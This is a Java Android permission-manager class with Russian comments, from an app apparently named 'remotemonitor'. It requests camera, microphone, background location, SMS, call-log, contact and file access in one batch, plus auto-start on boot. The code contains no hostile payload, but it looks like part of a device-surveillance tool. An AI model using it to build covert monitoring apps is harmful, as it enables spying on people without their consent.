package com.example.remotemonitor;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * Универсальный менеджер разрешений для Android 5.0-14
 * Адаптивная система с поддержкой новых разрешений Android 13+
 */
public class PermissionManager {
    
    private static final String TAG = "PermissionManager";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    
    private Context context;
    private PermissionCallback callback;
    
    // Базовые разрешения для всех версий Android
    private final String[] BASIC_PERMISSIONS = {
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.ACCESS_WIFI_STATE,
        Manifest.permission.CHANGE_WIFI_STATE,
        Manifest.permission.WAKE_LOCK,
        Manifest.permission.VIBRATE
    };
    
    // Разрешения для автозапуска и фоновой работы
    private final String[] BOOT_PERMISSIONS = {
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.FOREGROUND_SERVICE
    };
    
    // Разрешения для камеры
    private final String[] CAMERA_PERMISSIONS = {
        Manifest.permission.CAMERA
    };
    
    // Разрешения для аудио
    private final String[] AUDIO_PERMISSIONS = {
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.MODIFY_AUDIO_SETTINGS
    };
    
    // Разрешения для местоположения
    private final String[] LOCATION_PERMISSIONS = {
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    };
    
    // Разрешения для SMS и звонков
    private final String[] COMMUNICATION_PERMISSIONS = {
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE
    };
    
    // Разрешения для уведомлений (Android 13+)
    private final String[] NOTIFICATION_PERMISSIONS = {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ? 
            Manifest.permission.POST_NOTIFICATIONS : ""
    };
    
    // Callbacks
    public interface PermissionCallback {
        void onPermissionGranted(String permission);
        void onPermissionDenied(String permission);
        void onAllPermissionsGranted();
        void onPermissionError(String error);
    }
    
    public PermissionManager(Context context) {
        this.context = context;
    }
    
    public void setCallback(PermissionCallback callback) {
        this.callback = callback;
    }
    
    /**
     * Запрос всех необходимых разрешений
     */
    public void requestAllPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        // Добавляем базовые разрешения
        addPermissionsIfNeeded(permissionsToRequest, BASIC_PERMISSIONS);
        addPermissionsIfNeeded(permissionsToRequest, BOOT_PERMISSIONS);
        addPermissionsIfNeeded(permissionsToRequest, CAMERA_PERMISSIONS);
        addPermissionsIfNeeded(permissionsToRequest, AUDIO_PERMISSIONS);
        addPermissionsIfNeeded(permissionsToRequest, LOCATION_PERMISSIONS);
        addPermissionsIfNeeded(permissionsToRequest, COMMUNICATION_PERMISSIONS);
        
        // Разрешения для файлов (адаптивно под версию Android)
        addFilePermissions(permissionsToRequest);
        
        // Уведомления для Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            addPermissionsIfNeeded(permissionsToRequest, NOTIFICATION_PERMISSIONS);
        }
        
        // Дополнительные разрешения для местоположения в фоне (Android 10+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_BACKGROUND_LOCATION) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            requestPermissions(permissionsToRequest.toArray(new String[0]));
        } else {
            if (callback != null) {
                callback.onAllPermissionsGranted();
            }
        }
    }
    
    /**
     * Добавление файловых разрешений в зависимости от версии Android
     */
    private void addFilePermissions(List<String> permissionsToRequest) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+ - новые медиа разрешения
            String[] mediaPermissions = {
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO
            };
            addPermissionsIfNeeded(permissionsToRequest, mediaPermissions);
            
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11-12 - управление внешним хранилищем
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
            
        } else {
            // Android 5.0-10 - классические разрешения на хранилище
            String[] storagePermissions = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            };
            addPermissionsIfNeeded(permissionsToRequest, storagePermissions);
        }
    }
    
    /**
     * Добавление разрешений в список, если они еще не предоставлены
     */
    private void addPermissionsIfNeeded(List<String> permissionsToRequest, String[] permissions) {
        for (String permission : permissions) {
            if (permission != null && !permission.isEmpty() &&
                ContextCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
    }
    
    /**
     * Запрос конкретных разрешений
     */
    private void requestPermissions(String[] permissions) {
        if (context instanceof Activity) {
            ActivityCompat.requestPermissions((Activity) context, permissions, PERMISSION_REQUEST_CODE);
        } else {
            Log.e(TAG, "Context не является Activity - невозможно запросить разрешения");
            if (callback != null) {
                callback.onPermissionError("Context не является Activity");
            }
        }
    }
    
    /**
     * Обработка результата запроса разрешений
     */
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode != PERMISSION_REQUEST_CODE) {
            return;
        }
        
        int grantedCount = 0;
        int deniedCount = 0;
        
        for (int i = 0; i < permissions.length; i++) {
            String permission = permissions[i];
            boolean granted = grantResults[i] == PackageManager.PERMISSION_GRANTED;
            
            if (granted) {
                grantedCount++;
                if (callback != null) {
                    callback.onPermissionGranted(permission);
                }
                Log.i(TAG, "Разрешение предоставлено: " + permission);
            } else {
                deniedCount++;
                if (callback != null) {
                    callback.onPermissionDenied(permission);
                }
                Log.w(TAG, "Разрешение отклонено: " + permission);
            }
        }
        
        Log.i(TAG, String.format("Результат разрешений: %d предоставлено, %d отклонено", 
                                grantedCount, deniedCount));
        
        // Если все разрешения предоставлены
        if (deniedCount == 0 && callback != null) {
            callback.onAllPermissionsGranted();
        }
    }
    
    /**
     * Проверка конкретного разрешения
     */
    public boolean hasPermission(String permission) {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED;
    }
    
    /**
     * Проверка группы разрешений
     */
    public boolean hasPermissions(String[] permissions) {
        for (String permission : permissions) {
            if (!hasPermission(permission)) {
                return false;
            }
        }
        return true;
    }
    
    /**
     * Проверка всех базовых разрешений
     */
    public boolean hasBasicPermissions() {
        return hasPermissions(BASIC_PERMISSIONS);
    }
    
    /**
     * Проверка разрешений камеры
     */
    public boolean hasCameraPermissions() {
        return hasPermissions(CAMERA_PERMISSIONS);
    }
    
    /**
     * Проверка разрешений аудио
     */
    public boolean hasAudioPermissions() {
        return hasPermissions(AUDIO_PERMISSIONS);
    }
    
    /**
     * Проверка разрешений местоположения
     */
    public boolean hasLocationPermissions() {
        return hasPermissions(LOCATION_PERMISSIONS);
    }
    
    /**
     * Проверка разрешений связи (SMS, звонки)
     */
    public boolean hasCommunicationPermissions() {
        return hasPermissions(COMMUNICATION_PERMISSIONS);
    }
    
    /**
     * Проверка разрешений на файлы (адаптивно)
     */
    public boolean hasFilePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+
            return hasPermission(Manifest.permission.READ_MEDIA_IMAGES) ||
                   hasPermission(Manifest.permission.READ_MEDIA_VIDEO) ||
                   hasPermission(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            // Старые версии
            return hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
    }
    
    /**
     * Получение списка отсутствующих разрешений
     */
    public List<String> getMissingPermissions() {
        List<String> missing = new ArrayList<>();
        
        // Проверяем все группы разрешений
        addMissingPermissions(missing, BASIC_PERMISSIONS);
        addMissingPermissions(missing, BOOT_PERMISSIONS);
        addMissingPermissions(missing, CAMERA_PERMISSIONS);
        addMissingPermissions(missing, AUDIO_PERMISSIONS);
        addMissingPermissions(missing, LOCATION_PERMISSIONS);
        addMissingPermissions(missing, COMMUNICATION_PERMISSIONS);
        
        // Файловые разрешения
        if (!hasFilePermissions()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                missing.addAll(Arrays.asList(
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.READ_MEDIA_AUDIO
                ));
            } else {
                missing.add(Manifest.permission.READ_EXTERNAL_STORAGE);
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                    missing.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
                }
            }
        }
        
        return missing;
    }
    
    /**
     * Добавление отсутствующих разрешений в список
     */
    private void addMissingPermissions(List<String> missing, String[] permissions) {
        for (String permission : permissions) {
            if (permission != null && !permission.isEmpty() && !hasPermission(permission)) {
                missing.add(permission);
            }
        }
    }
    
    /**
     * Получение информации о разрешениях для диагностики
     */
    public String getPermissionStatus() {
        StringBuilder status = new StringBuilder();
        status.append("=== СТАТУС РАЗРЕШЕНИЙ ===\n");
        status.append("Android API: ").append(Build.VERSION.SDK_INT).append("\n\n");
        
        status.append("Базовые: ").append(hasBasicPermissions() ? "✅" : "❌").append("\n");
        status.append("Камера: ").append(hasCameraPermissions() ? "✅" : "❌").append("\n");
        status.append("Аудио: ").append(hasAudioPermissions() ? "✅" : "❌").append("\n");
        status.append("Местоположение: ").append(hasLocationPermissions() ? "✅" : "❌").append("\n");
        status.append("Связь: ").append(hasCommunicationPermissions() ? "✅" : "❌").append("\n");
        status.append("Файлы: ").append(hasFilePermissions() ? "✅" : "❌").append("\n");
        
        List<String> missing = getMissingPermissions();
        if (!missing.isEmpty()) {
            status.append("\nОтсутствующие разрешения:\n");
            for (String permission : missing) {
                status.append("• ").append(permission).append("\n");
            }
        }
        
        return status.toString();
    }
}